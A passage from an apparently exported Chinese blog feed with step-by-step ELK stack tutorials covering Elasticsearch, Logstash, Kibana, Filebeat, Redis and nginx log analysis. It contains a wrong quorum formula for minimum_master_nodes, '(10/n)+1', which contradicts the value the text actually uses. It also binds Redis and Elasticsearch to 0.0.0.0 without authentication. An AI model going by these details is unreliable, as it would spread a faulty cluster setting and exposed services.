&quot;$http_user_agent&quot;, &apos; &apos;&quot;x_forwarded&quot;: &quot;$http_x_forwarded_for&quot;&apos; &apos; &#125;&apos;; access_log /var/log/nginx/access-json.log log_json; 设置nginx认证设置nginx必须使用用户名密码方式验证,修改配置文件 1234567location / &#123; root html; index index.html index.htm; auth_basic &quot;kibana auth&quot;; auth_basic_user_file /etc/nginx/conf.d/passwd; proxy_pass http://127.0.0.1:5601; &#125; 接着去创建一个passwd,写入用户名密码 12[root@localhost conf.d]# touch passwd[root@localhost conf.d]# vim passwd 但如果明文写入其中的话,并不安全,所以需要加密,我们使用openssl软件进行加密.OpenSSL是一个强大的安全套接字层密码库,参数passwd表示生成散列密码,-apr1表示基于 MD5 的密码算法, 为Apache 变异加密,而且相同的值每次所计算的结果均不一样 12[root@localhost conf.d]# openssl passwd -apr1 123456$apr1$VSksFdhI$lU3M4V2wRPJ9qaTzYrDeX/ 写入内容为: 1admin:$apr1$VSksFdhI$lU3M4V2wRPJ9qaTzYrDeX/ 重启nginx 1[root@localhost nginx]# systemctl restart nginx 再次访问的话就需要输入用户名密码才可以打开nginx界面 部署filebeat下载filebeat 1[root@localhost local]# wget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-6.6.2-linux-x86_64.tar.gz 解压缩 1[root@localhost local]# tar zxvf filebeat-6.6.2-linux-x86_64.tar.gz 修改其配置文件 123456789101112131415161718192021222324252627282930[root@localhost local]# cd filebeat-6.6.2-linux-x86_64/ [root@localhost filebeat-6.6.2-linux-x86_64]# vim filebeat.yml filebeat.inputs:#设置输入类型为日志类型- type: log #开启input配置 enabled: true #设置每隔一秒检查一次文件更新 backoff: &quot;1s&quot; #从开头读取文件 tail_files: false # 修改路径为nginx日志路径,即接收nginx日志文件 paths: - /var/log/nginx/access-json.log fields: #自定义一个字段 filetype: logjson #给自定义的字段赋值 fields_under_root: true #设置自定义字段为文档中的顶级字段#输出到redis当中去 output.redis: enabled: true hosts: [&quot;127.0.0.1:6379&quot;] port: 6379 key: nginx db: 0 datatype: list 搭建redis缓存服务器下载 1[root@localhost local]# wget http://download.redis.io/releases/redis-4.0.14.tar.gz 解压 1[root@localhost local]# tar zxvf redis-4.0.14.tar.gz 编译 1[root@localhost redis-4.0.14]# make 如果出现以下报错 12345678910[root@localhost redis-4.0.14]# makecd src &amp;&amp; make allmake[1]: 进入目录“/usr/local/redis-4.0.14/src” CC Makefile.depmake[1]: 离开目录“/usr/local/redis-4.0.14/src”make[1]: 进入目录“/usr/local/redis-4.0.14/src” CC adlist.oIn file included from adlist.c:34:0:zmalloc.h:50:31: 致命错误：jemalloc/jemalloc.h：没有那个文件或目录 #include &lt;jemalloc/jemalloc.h&gt; 输入 1make MALLOC=libc 接着在进行编译即可 初始化redis 12[root@localhost redis-4.0.14]# cd utils/[root@localhost utils]# ./install_server.sh 如果出现以下问题 1234567891011121314[root@localhost utils]# ./install_server.sh Welcome to the redis service installerThis script will help you easily set up a running redis serverPlease select the redis port for this instance: [6379] Selecting default: 6379Please select the redis config file name [/etc/redis/6379.conf] Selected default - /etc/redis/6379.confPlease select the redis log file name [/var/log/redis_6379.log] Selected default - /var/log/redis_6379.logPlease select the data directory for this instance [/var/lib/redis/6379] Selected default - /var/lib/redis/6379Please select the redis executable path [] Mmmmm... it seems like you don&apos;t have a redis executable. Did you run make install yet? 那么就去创建软连接,将redis-server的软链接创建到/usr/local/bin下 1[root@localhost src]# ln -s /usr/local/redis-4.0.14/src/redis-server /usr/local/bin/ 接着去修改redis配置文件 1234567891011[root@localhost utils]# vim /etc/redis/6379.conf#设置任意主机均可连接bind 0.0.0.0#默认6379端口port 6379#允许在后台启动daemonize yes#输入的日志文件logfile /var/log/redis_6379.log#数据目录dir /var/lib/redis/6379 开启redis 1[root@localhost utils]# systemctl restart redis_6379 将redis-cli添加到/usr/local/bin目录下,然后启动redis-cli客户端 12345678[root@localhost src]# ln -s /usr/local/redis-4.0.14/src/redis-cli /usr/local/bin/[root@localhost src]# redis-cli127.0.0.1:6379&gt; set name haha #创建个键,其名为hahaOK127.0.0.1:6379&gt; keys * #查看所有的键1) &quot;name&quot;127.0.0.1:6379&gt; get name #查看name键的值&quot;haha&quot; 同步系统时间,这里与阿里的ntp服务器进行同步 ntp1.aliyun.com ~ ntp5.aliyun.com这几个ntp服务器都可以使用的 12345[root@localhost config]# ntpdate ntp1.aliyun.com #进行同步29 May 15:04:13 ntpdate[20946]: adjust time server 120.25.115.20 offset -0.004502 sec[root@localhost config]# date -R #查看当前时区时间Wed, 29 May 2019 15:04:56 +0800 修改logstash配置文件修改logstash配置文件,使用logstash-input-redis插件 1234567891011121314151617181920212223242526272829[root@localhost config]# vim logstash.conf#修改如下input &#123; redis &#123; host =&gt; &quot;127.0.0.1&quot; port =&gt; 6379 key =&gt; &quot;nginx&quot; data_type =&gt; &quot;list&quot; db =&gt; 0 &#125;&#125;filter &#123; json &#123; #使用JSON解析过滤器 source =&gt; &quot;message&quot; remove_field =&gt; [&quot;beat&quot;,&quot;offset&quot;,&quot;tags&quot;,&quot;prospector&quot;] &#125; date &#123; #使用 match =&gt; [&quot;timestamp&quot;, &quot;dd/MMM/yyyy:HH:mm:ss Z&quot;] target =&gt; &quot;@timestamp&quot; &#125;&#125;output &#123; elasticsearch &#123; hosts =&gt; [&quot;127.0.0.1:9200&quot;] index =&gt; &quot;redis-%&#123;+YYYY.MM.dd&#125;&quot; &#125;&#125; 启动logstash 1[root@localhost config]# ../bin/logstash -f logstash.conf 启动filebeat 1[root@localhost filebeat]# ./filebeat -e -c filebeat.yml 当logstash无法使用的时候,数据会保存到redis中,一旦logstash可以正常使用的时候,会将redis的数据取出进行数据过滤展示在kibana中 部署elasticsearch集群修改其配置文件 123456#检查两台主机的集群名是否一致,若不一致,则无法加入统一集群中cluster.name: my-cluster#检查端口,使用默认端口即可transport.tcp.port: 9300#设置使用zen discovery机制对本地两台主机进行监控discovery.zen.ping.unicast.hosts: [&quot;192.168.48.129:9300&quot;, &quot;192.168.48.130:9300&quot;] 设置主节点资格并互相连接的节点最小数目,如果不做这种设置,遭受网络故障的集群就有可能将集群分为两个独立的集群,成为脑裂,计算公式为:对于n个节点来说,则就取(10/n)+1的值 1discovery.zen.minimum_master_nodes: 2 配置主节点和数据节点 12node.master: true #成为主节点node.data: true #存储数据 另一台主机的配置 1234567cluster.name: my-clusternode.name: node-2 #两台主机的集群名一致,但节点名不能设置一样的transport.tcp.port: 9300node.master: truenode.data: truediscovery.zen.ping.unicast.hosts: [&quot;192.168.48.129:9300&quot;, &quot;192.168.48.130:9300&quot;]discovery.zen.minimum_master_nodes: 2 检测是否成功 12345678910111213141516171819202122232425262728293031323334353637[root@localhost ~]# curl http://192.168.48.129:9200&#123; &quot;name&quot; : &quot;node-1&quot;, &quot;cluster_name&quot; : &quot;cluster&quot;, &quot;cluster_uuid&quot; : &quot;rTfmsrGcTjWqqPk5MPRq7A&quot;, #配置成功之后其uuid变化 &quot;version&quot; : &#123; &quot;number&quot; : &quot;6.6.2&quot;, &quot;build_flavor&quot; : &quot;default&quot;, &quot;build_type&quot; : &quot;tar&quot;, &quot;build_hash&quot; : &quot;3bd3e59&quot;, &quot;build_date&quot; : &quot;2019-03-06T15:16:26.864148Z&quot;, &quot;build_snapshot&quot; : false, &quot;lucene_version&quot; : &quot;7.6.0&quot;, &quot;minimum_wire_compatibility_version&quot; : &quot;5.6.0&quot;, &quot;minimum_index_compatibility_version&quot; : &quot;5.0.0&quot; &#125;, &quot;tagline&quot; : &quot;You Know, for Search&quot;&#125;[root@localhost ~]# curl http://192.168.48.130:9200&#123; &quot;name&quot; : &quot;node-2&quot;, &quot;cluster_name&quot; : &quot;cluster&quot;, &quot;cluster_uuid&quot; : &quot;rTfmsrGcTjWqqPk5MPRq7A&quot;, &quot;version&quot; : &#123; &quot;number&quot; : &quot;6.6.2&quot;, &quot;build_flavor&quot; : &quot;default&quot;, &quot;build_type&quot; : &quot;tar&quot;, &quot;build_hash&quot; : &quot;3bd3e59&quot;, &quot;build_date&quot; : &quot;2019-03-06T15:16:26.864148Z&quot;, &quot;build_snapshot&quot; : false, &quot;lucene_version&quot; : &quot;7.6.0&quot;, &quot;minimum_wire_compatibility_version&quot; : &quot;5.6.0&quot;, &quot;minimum_index_compatibility_version&quot; : &quot;5.0.0&quot; &#125;, &quot;tagline&quot; : &quot;You Know, for Search&quot;&#125; 成功安装,查看集群查询健康状态(设置的pretty=true参数表示以便于查看的形式显示): 1http://192.168.48.129:9200/_cluster/health?pretty=true 其状态有三种情况 green:表示所有主分片和副本分片都处于活动状态 yellow:表示所有的主分片都处于活动状态,非所有副本状态处于活动状态 red:表示不是所有的主分片都处于活动状态 编辑kibana配置文件修改kibana配置文件,设置连接主机为集群中的两台主机 1elasticsearch.hosts: [&quot;http://192.168.48.129:9200&quot;,&quot;http://192.168.48.130&quot;] 集群的状态查询 1http://192.168.48.129:9200/_cluster/state?pretty=true 查看节点信息 1http://192.168.48.129:9200/_nodes?pretty=true 安装ik中文分词器简介: 123456IKAnalyzer是一个开源的，基于java语言开发的轻量级的中文分词工具包。采用了特有的“正向迭代最细粒度切分算法“，支持细粒度和最大词长两种切分模式；具有83万字/秒（1600KB/S）的高速处理能力。采用了多子处理器分析模式，支持：英文字母、数字、中文词汇等分词处理，兼容韩文、日文字符优化的词典存储，更小的内存占用。支持用户词典扩展定义针对Lucene全文检索优化的查询分析器IKQueryParser(作者吐血推荐)；引入简单搜索表达式，采用歧义分析算法优化查询关键字的搜索排列组合，能极大的提高Lucene检索的命中率。下载IK中文分词器 下载IK中文分词器 1wget https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v6.6.2/elasticsearch-analysis-ik-6.6.2.zip 然后在elasticsearch目录下的plugins下创建目录ik,将IK中文分词器在该目录下解压 12345678910[elk@localhost ik]$ lscommons-codec-1.9.jarcommons-logging-1.2.jarconfigelasticsearch-analysis-ik-6.6.2.jarelasticsearch-analysis-ik-6.6.2.ziphttpclient-4.5.2.jarhttpcore-4.4.4.jarplugin-descriptor.propertiesplugin-security.policy 接下来重启elasticsearch,然后在开发者工具下设置 创建一个索引 1PUT /my_ik 创建个映射 12345678910POST /my_ik/fulltext/_mapping&#123; &quot;properties&quot;: &#123; &quot;content&quot;:&#123; &quot;type&quot;: &quot;text&quot;, &quot;analyzer&quot;: &quot;ik_max_word&quot;, &quot;search_analyzer&quot;: &quot;ik_max_word&quot; &#125; &#125;&#125; 插入四组内容 12345678910111213141516171819POST /my_ik/fulltext/1&#123; &quot;content&quot;:&quot;美国留给伊拉克的是个烂摊子吗&quot;&#125;POST /my_ik/fulltext/2&#123; &quot;content&quot;:&quot;公安部：各地校车将享最高路权&quot;&#125;POST /my_ik/fulltext/3&#123; &quot;content&quot;:&quot;中韩渔警冲突调查：韩警平均每天扣1艘中国渔船&quot;&#125;POST /my_ik/fulltext/4&#123; &quot;content&quot;:&quot;中国驻洛杉矶领事馆遭亚裔男子枪击 嫌犯已自首&quot;&#125; 查询content中带有中国的数据 12345678GET /my_ik/fulltext/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;content&quot;: &quot;中国&quot; &#125; &#125;&#125; 设置搜索结果高亮显示 123456789101112131415GET /fxik/fulltext/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;content&quot;: &quot;中国&quot; &#125; &#125;, &quot;highlight&quot;: &#123; &quot;pre_tags&quot; : [&quot;&lt;strong&gt;&quot;, &quot;&lt;tag2&gt;&quot;], &quot;post_tags&quot; : [&quot;&lt;/strong&gt;&quot;, &quot;&lt;/tag2&gt;&quot;], &quot;fields&quot; : &#123; &quot;content&quot; : &#123;&#125; &#125; &#125;&#125; 使用ik_max_word分词器对内容进行分词 12345GET /my_ik/_analyze&#123; &quot;text&quot;:&quot;中华人民共和国国歌&quot;, &quot;tokenizer&quot;: &quot;ik_max_word&quot;&#125; 使用标准分词器对内容进行分词.其是将每个字符都作为关键字 12345GET /fxik/_analyze&#123; &quot;text&quot;:&quot;中华人民共和国国歌&quot;, &quot;tokenizer&quot;: &quot;standard&quot;&#125; 依次重启各个服务 对elasticsearch进行基本的搜索 查询elasticsearch中所有信息 123456GET _search&#123; &quot;query&quot;: &#123; &quot;match_all&quot;: &#123;&#125; &#125;&#125; 创建一个索引 1PUT /class 向索引添加一条内容 1234567POST /fxclass/student/1&#123; &quot;name&quot;:&quot;zhangsan&quot;, &quot;age&quot;:20, &quot;email&quot;:&quot;zhangsan@qq.com&quot;, &quot;desc&quot;:&quot;he is a good person&quot;&#125; 获取该索引的内容 1GET /class/_search 根据字段的关键字进行搜索 12345678GET /class/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;desc&quot;: &quot;person&quot; #搜索desc字段中存在person关键字的内容 &#125; &#125;&#125; 实现报表分析因为没有数据,所以我们去下载范例进行操作 1wget https://download.elastic.co/demos/kibana/gettingstarted/accounts.zip 解压,然后将该文件加载到elasticsearch中 1[root@localhost local]# curl -H &apos;Content-Type: application/x-ndjson&apos; -XPOST &apos;localhost:9200/bank/account/_bulk?pretty&apos; --data-binary @accounts.json 进行报表分析,建立pattern 创建可视化界面,使用模板创建]]></content>
      <categories>
        <category>运维技术</category>
      </categories>
      <tags>
        <tag>ELK</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建ELK实时分析nginx日志]]></title>
    <url>%2F2019%2F06%2F04%2F%E4%BD%BF%E7%94%A8elk%E5%AF%B9nginx%E6%97%A5%E5%BF%97%E8%BF%9B%E8%A1%8C%E5%AE%9E%E6%97%B6%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[路漫漫其修道远，吾将上下而求索。 安装nginx12345[root@localhost ~]# yum install nginx -y [root@localhost ~]# /usr/sbin/nginx -v nginx version: nginx/1.12.2 检查elk是否均已启动: elasticsearch 123[root@localhost ~]# ps -ef | grep elasticsearch elk 2728 1 1 5月31 pts/0 01:07:32 /bin/java -Xms1g -Xmx1g -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Des.networkaddress.cache.ttl=60 -Des.networkaddress.cache.negative.ttl=10 -XX:+AlwaysPreTouch -Xss1m -Des.distribution.flavor=default -Des.distribution.type=tar -cp /usr/local/elasticsearch-6.6.2/lib/* org.elasticsearch.bootstrap.Elasticsearch elk 2824 2728 0 5月31 pts/0 00:00:00 /usr/local/elasticsearch-6.6.2/modules/x-pack-ml/platform/linux-x86_64/bin/controller root 19874 13681 0 21:16 pts/1 00:00:00 grep --color=auto elasticsearch kibana 123[root@localhost ~]# ps -ef | grep kibana root 2651 1 0 5月31 pts/0 00:55:12 /usr/local/kibana-6.6.2-linux-x86_64/bin/../node/bin/node --no-warnings --max-http-header-size=65536 /usr/local/kibana-6.6.2-linux-x86_64/bin/../src/cli root 19970 13681 0 21:17 pts/1 00:00:00 grep --color=auto kibana root 35609 2651 0 6月01 pts/0 00:00:06 /usr/local/kibana-6.6.2-linux-x86_64/node/bin/node --no-warnings --max-http-header-size=65536 /usr/local/kibana-6.6.2-linux-x86_64/src/legacy/core_plugins/interpreter/server/lib/route_expression/thread/babeled.js kibana 123[root@localhost ~]# ps -ef | grep logstash root 17996 1 8 20:53 pts/3 00:02:04 /bin/java -Xms1g -Xmx1g -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/local/logstash-6.6.2/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/local/logstas-6.6.2/logstash-core/lib/jars/commons-codec-1.11.jar:/usr/local/logstash-6.6.2/logstash-3.10.0.jar:/usr/local/logstash-6.6.2/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/local/logstash-6.6.2/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/local/logstash-6.6.2/logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash -f /usr/local/logstash-6.6.2/config/logstash.conf root 20014 13681 0 21:18 pts/1 00:00:00 grep --color=auto logstash 然后去修改logstash的配置文件,设置为nginx日志文件 GROK插件修改配置文件之前需要了解一些logstash的插件grok,我们这里使用logstash-filter-grok插件去匹配日志信息 grok插件:grok插件是logstash中非常强大的插件，其中内置了许多的正则表达式,用来正则匹配各种数据，但其性能和对资源的损耗也是让人为之诟病。 首先看一下nginx输入日志格式 12345[root@localhost ~]# cat /etc/nginx/nginx.conf http &#123; log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos; &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; 在以下路径下存在一个httpd的正则匹配文件,与之nginx输入日志格式相符 1234567891011[root@localhost patterns]# pwd /usr/local/logstash-6.6.2/vendor/bundle/jruby/2.3.0/gems/logstash-patterns-core-4.1.2/patterns [root@localhost patterns]# cat httpd HTTPDUSER %&#123;EMAILADDRESS&#125;|%&#123;USER&#125;HTTPDERROR_DATE %&#123;DAY&#125; %&#123;MONTH&#125; %&#123;MONTHDAY&#125; %&#123;TIME&#125; %&#123;YEAR&#125;# Log formatsHTTPD_COMMONLOG %&#123;IPORHOST:clientip&#125; %&#123;HTTPDUSER:ident&#125; %&#123;HTTPDUSER:auth&#125; \[%&#123;HTTPDATE:timestamp&#125;\] &quot;(?:%&#123;WORD:verb&#125; %&#123;NOTSPACE:request&#125;(?: HTTP/%&#123;NUMBER:httpversion&#125;)?|%&#123;DATA:rawrequest&#125;)&quot; %&#123;NUMBER:response&#125; (?:%&#123;NUMBER:bytes&#125;|-)HTTPD_COMBINEDLOG %&#123;HTTPD_COMMONLOG&#125; %&#123;QS:referrer&#125; %&#123;QS:agent&#125; 修改配置文件修改logstash的配置文件,使用来匹配HTTPD_COMMONLOG格式去匹配日志数据 另外也需要date插件来从字段中解析日期，然后用这个日期作为logstash中事件的时间戳（timestamp）。 123456789101112131415161718192021222324252627[root@localhost ~]# vim /usr/local/logstash-6.6.2/config/logstash.conf #填写以下信息input &#123; file &#123; path =&gt; &quot;/var/log/nginx/access.log&quot; #填写nginx日志文件路径 type =&gt; &quot;nginxaccess&quot; #设置类型,名字容易辨识就好 start_position =&gt; &quot;beginning&quot; #设置开始位置 &#125;&#125;filter &#123; grok &#123; match =&gt; &#123; &quot;message&quot; =&gt; &quot;%&#123;HTTPD_COMBINEDLOG&#125;&quot; &#125; #匹配HTTPD_COMBINEDLOG信息 &#125; date &#123; match =&gt; [&quot;timestamp&quot;, &quot;dd/MMM/yyyy:HH:mm:ss Z&quot;] #匹配tomestamp target =&gt; &quot;@timestamp&quot; #覆盖@timestamp字段 &#125;&#125;output &#123; #输出到elasticsearch中 elasticsearch &#123; hosts =&gt; [&quot;127.0.0.1:9200&quot;] index =&gt; &quot;nginx-%&#123;+YYYY.MM.dd&#125;&quot; #设置索引格式 &#125;&#125; 然后运行logstash 1[root@localhost logstash-6.6.2]# ./startup.sh 访问kibana在浏览器访问kibana界面,可以看到刚刚所添加的nginx日志索引 然后去建一个pattern,成功匹配到刚刚创建的索引 选时间戳,创建pattern 然后在Discover模块选nginx-* 便可以查看到nginx的日志啦 查看客户端ip 查看请求信息]]></content>
      <categories>
        <category>运维技术</category>
      </categories>
      <tags>
        <tag>ELK</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ELK安装部署]]></title>
    <url>%2F2019%2F05%2F30%2FELK%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[不断进步,直到羔羊变成雄狮! ELK Stack 简介ELK 不是一款软件，而是 Elasticsearch、Logstash 和 Kibana 三种软件产品的首字母缩写。这三者都是开源软件，通常配合使用，而且又先后归于 Elastic.co 公司名下，所以被简称为 ELK Stack。根据 Google Trend 的信息显示，ELK Stack 已经成为目前最流行的集中式日志解决方案。 Elasticsearch：分布式搜索和分析引擎，具有高可伸缩、高可靠和易管理等特点。基于 Apache Lucene 构建，能对大容量的数据进行接近实时的存储、搜索和分析操作。通常被用作某些应用的基础搜索引擎，使其具有复杂的搜索功能； Logstash：数据收集引擎。它支持动态的从各种数据源搜集数据，并对数据进行过滤、分析、丰富、统一格式等操作，然后存储到用户指定的位置； Kibana：数据分析和可视化平台。通常与 Elasticsearch 配合使用，对其中数据进行搜索、分析和以统计图表的方式展示； Filebeat：ELK 协议栈的新成员，一个轻量级开源日志文件数据搜集器，基于 Logstash-Forwarder 源代码开发，是对它的替代。在需要采集日志数据的 server 上安装 Filebeat，并指定日志目录或日志文件后，Filebeat 就能读取数据，迅速发送到 Logstash 进行解析，亦或直接发送到 Elasticsearch 进行集中式存储和分析。 Elasticsearch安装:部署环境我当前系统为红帽7.4 123[root@localhost ~]# cat /etc/redhat-release Red Hat Enterprise Linux Server release 7.4 (Maipo) 因为Elasticsearch需要Java8以上的版本,所以需要检查Java环境,redhat7的java环境是ok的,不需要进行额外配置 1[root@localhost ~]# java -version openjdk version &quot;1.8.0_131&quot; //java8又称jdk1.8 OpenJDK Runtime Environment (build 1.8.0_131-b12) OpenJDK 64-Bit Server VM (build 25.131-b12, mixed mode) 开始安装下载Elasticsearch,我这里用得是6.6.2版本 123[root@localhost local]# wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.6.2.tar.gz[root@localhost local]# tar zxvf elasticsearch-6.6.2.tar.gz 创建目录,用来保存系统文件和日志 123[root@localhost ~]# mkdir -p /usr/local/elk/data [root@localhost ~]# mkdir /usr/local/elk/logs 修改配置文件我们需要去修改其配置文件/usr/local/elasticsearch-6.6.2/config下的elasticsearch.yml文件 123456789101112131415161718[root@localhost config]# vim elasticsearch.yml#设置集群名cluster.name: my-cluster #设置节点名 node.name: node-1 #设置数据保存文件path.data: /usr/local/elk/data#设置日志保存文件path.logs: /usr/local/elk/logs#设置监听主机地址,允许任意主机均可访问network.host: 0.0.0.0#默认使用9200端口http.port: 9200 然后去修改jvm.options配置文件 12345[root@localhost config]# vim jvm.options -Xms512m #设置最小堆内存为512M-Xmx512m #设置最大堆内存为512M 因为elasticsearch不能使用root用户去打开,所以需要创建个elk用户,使用该用户去登陆 12345[root@localhost local]# useradd elk[root@localhost local]# chown -R elk:elk elk[root@localhost local]# chown -R elk:elk elasticsearch-6.6.2/[root@localhost local]# su - elk[elk@localhost ~]$ 另外需要去修改系统配置文件 12345[root@localhost local]# vim /etc/security/limits.conf#添加以下内容soft nofile 65536 hard nofile 65536 123[root@localhost local]# vim /etc/sysctl.conf#添加以下内容vm.max_map_count=262144 使其生效 12[root@localhost local]# sysctl -p vm.max_map_count = 262144 新开个连接,然后检测是否设置成功 1234[root@localhost ~]# ulimit -Hn65536[root@localhost ~]# ulimit -Sn65536 启动服务接下来切换到elk用户去启动elasticsearch 1234567[root@localhost ~]# su - elk 上一次登录：五 5月 24 16:47:42 CST 2019pts/2 上 [elk@localhost ~]$ cd /usr/local/elasticsearch-6.6.2/bin/ [elk@localhost bin]$ ./elasticsearch 通过访问本地的9200端口检查是否安装成功 但因为我们开启的elasticsearch是在终端中开启的,一旦终端关闭,那么该服务将关闭,所以我们需要让该程序在后台执行 1nohup /usr/local/elasticsearch-6.6.2/bin/elasticsearch &gt;&gt; /usr/local/elasticsearch-6.6.2/output.log 2&gt;&amp;1 &amp; 后台运行我们可以将其做出shell脚本让其在后台去执行 12345678910[elk@localhost elasticsearch-6.6.2]$ touch startup.sh[elk@localhost elasticsearch-6.6.2]$ vim startup.sh#将以下内容添加进去#! /bin/bashnohup /usr/local/elasticsearch-6.6.2/bin/elasticsearch &gt;&gt; /usr/local/elasticsearch-6.6.2/output.log 2&gt;&amp;1 &amp;#赋予权限[elk@localhost elasticsearch-6.6.2]$ chmod a+x startup.sh #执行脚本 [elk@localhost elasticsearch-6.6.2]$ ./startup.sh 关闭服务1234567#找到其进程号 [elk@localhost elasticsearch-6.6.2]$ ps -ef | grep java elk 18114 1 2 18:14 pts/1 00:00:54 /bin/java -Xms1g -Xmx1g -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOcc #杀死进程 [elk@localhost elasticsearch-6.6.2]$ kill -9 18114 Kibana安装下载解压12[root@localhost local]# wget https://artifacts.elastic.co/downloads/kibana/kibana-6.6.2-linux-x86_64.tar.gz[root@localhost local]# tar zxvf kibana-6.6.2-linux-x86_64.tar.gz 注:kibana可以和elasticsearch不在同一台机器上,可以用来做成集群 修改配置文件修改该目录中config文件中的kibana.yml配置文件 12345678910111213141516171819[root@localhost config]# vim kibana.yml #设置监听端口为5601server.port: 5601#设置可访问的主机地址server.host: &quot;0.0.0.0&quot;#设置elasticsearch主机地址elasticsearch.hosts: [&quot;http://localhost:9200&quot;]#如果elasticsearch设置了用户名密码,那么需要配置该两项,如果没配置,那就不用管#elasticsearch.username: &quot;user&quot;#elasticsearch.password: &quot;pass&quot; 后台启动服务1234[root@localhost kibana-6.6.2-linux-x86_64]# vim startup.sh #添加以下内容#! /bin/bashnohup /usr/local/kibana-6.6.2-linux-x86_64/bin/kibana &gt;&gt; /usr/local/kibana-6.6.2-linux-x86_64/output.log 2&gt;&amp;1 &amp; 访问服务通过浏览器访问本地的5601端口去使用kibana服务 关闭服务12345[root@localhost kibana-6.6.2-linux-x86_64]# ps -ef | grep kibana root 3080 1 1 22:16 pts/2 00:01:04 /usr/local/kibana-6.6.2-linux-x86_64/bin/../node/bin/node --no-warnings --max-http-header-size=65536 /usr/local/kibana-6.6.2-linux-x86_64/bin/../src/cli root 4245 2683 0 23:44 pts/2 00:00:00 grep --color=auto kibana [root@localhost kibana-6.6.2-linux-x86_64]# kill -9 3080 Logstash安装下载解压缩123[root@localhost local]# wget https://artifacts.elastic.co/downloads/logstash/logstash-6.6.2.tar.gz [root@localhost logstash-6.6.2]# tar zxvf logstash-6.6.2.tar.gz 修改配置文件 1234567[root@localhost config]# vim jvm.options #修改如下 -Xms512m #设置最小内存 -Xmx512m #设置最大内存 进入bin目录下运行程序,将日志信息输出到屏幕上 1[root@localhost bin]# ./logstash -e &apos;input &#123;stdin&#123;&#125;&#125; output&#123;stdout&#123;&#125;&#125;&apos; 比如输入个hello,world然后回车,那么就会把结果输出到屏幕上 使用配置文件启动编辑主配置文件 1234567891011121314151617181920[root@localhost logstash-6.6.2]# cd config/[root@localhost config]# mv logstash-sample.conf logstash.conf[root@localhost config]# vim logstash.conf #删除其文件内容,添加以下内容input &#123; # 从文件读取日志信息 file &#123; path =&gt; &quot;/var/log/messages&quot; type =&gt; &quot;system&quot; start_position =&gt; &quot;beginning&quot; &#125;&#125;filter &#123;&#125;output &#123; # 标准输出 stdout &#123;&#125;&#125; 使用主配置文件去启动程序 1[root@localhost bin]# ./logstash -f ../config/logstash.conf 使用脚本启动12345678[root@localhost logstash-6.6.2]# touch startup.sh[root@localhost logstash-6.6.2]# vim startup.sh#内容如下#!/bin/bashnohup /usr/local/logstash-6.6.2/bin/logstash -f /usr/local/logstash-6.6.2/config/logstash.conf &gt;&gt; /usr/local/logstash-6.6.2/output.log 2&gt;&amp;1 &amp;[root@localhost logstash-6.6.2]# chmod a+x startup.sh [root@localhost logstash-6.6.2]# ./startup.sh logstash插件logstash是通过插件对其功能进行加强 插件分类: inputs 输入 codecs 解码 filters 过滤 outputs 输出 在Gemfile文件里记录了logstash的插件 1[root@localhost logstash-6.6.2]# cat Gemfile 如果需要其他插件的话,那么需要去其github上的库下载插件,地址为:https://github.com/logstash-plugins 使用filter插件logstash-filter-mutate 1234567891011121314151617[root@localhost config]# vim logstash2.conf #创建一个新的配置文件用来过滤 input &#123; stdin &#123; &#125;&#125;filter &#123; mutate &#123; split =&gt; [&quot;message&quot;, &quot;|&quot;] &#125;&#125;output &#123; stdout &#123; &#125;&#125; 当输入sss|sssni|akok223|23即会按照|分隔符进行分隔 其数据处理流程:input–&gt;解码–&gt;filter–&gt;解码–&gt;output ELK联动我们需要使用logstash-output-elasticsearch插件将logstash日志信息收集到elasticsearch当中 检查插件因为在logstash当中就存在elasticsearch的插件,那么就可以直接使用的 1234567[root@localhost logstash-6.6.2]# cat Gemfile |grep elasticsearch gem &quot;logstash-filter-elasticsearch&quot; gem &quot;logstash-input-elasticsearch&quot; gem &quot;logstash-output-elasticsearch&quot; 修改配置文件那么我们去写个配置文件,通过配置文件去将elasticsearch和logstash结合起来 123456789101112131415161718192021[root@localhost config]# vim logstash3.conf #填写以下内容 input &#123; # 从文件读取日志信息 file &#123; path =&gt; &quot;/var/log/messages&quot; type =&gt; &quot;system&quot; start_position =&gt; &quot;beginning&quot; &#125;&#125;filter &#123;&#125;output &#123; elasticsearch &#123; hosts =&gt; [&quot;127.0.0.1:9200&quot;] index =&gt; &quot;msg-%&#123;+YYYY.MM.dd&#125;&quot; &#125;&#125; 同步系统时间因为系统时间不准确,所以更新一下系统时间,与阿里的ntp服务器进行同步 ntp1.aliyun.com ~ ntp5.aliyun.com这几个ntp服务器都可以使用的 12345[root@localhost config]# ntpdate ntp1.aliyun.com #进行同步 29 May 15:04:13 ntpdate[20946]: adjust time server 120.25.115.20 offset -0.004502 sec [root@localhost config]# date -R #查看当前时区时间 Wed, 29 May 2019 15:04:56 +0800 启动服务然后去启动logstash服务 1[root@localhost config]# ../bin/logstash -f logstash3.conf ELK联动去访问本地的5601端口,打开kibana 可以在kibana上看到增加了一个索引 然后去创建模式,设置索引模式为msg-*,即是以msg-开头的索引都进行匹配 设置按系统时间来进行过滤 